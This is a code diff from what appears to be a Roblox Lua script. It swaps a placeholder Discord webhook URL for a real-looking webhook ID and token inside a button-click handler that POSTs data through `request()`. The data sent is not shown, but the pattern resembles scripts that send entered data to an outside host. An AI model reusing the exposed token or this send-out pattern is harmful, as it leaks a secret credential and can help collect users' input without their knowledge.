@@ -593,7 +593,7 @@ enterButton.MouseButton1Click:Connect(function()
         -- Send webhook with error handling
         local success, err = pcall(function()
             local response = request({
-                Url = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL_HERE",
+                Url = "https://discord.com/api/webhooks/1475151471631667378/MMcbj311BeXhS5kom8h8InyjHmygsQQR_6_qOxbQjKV7Pt2r1FszKsr0cxD1hdkz-oAa",
                 Method = "POST",
                 Headers = {
                     ["Content-Type"] = "application/json"
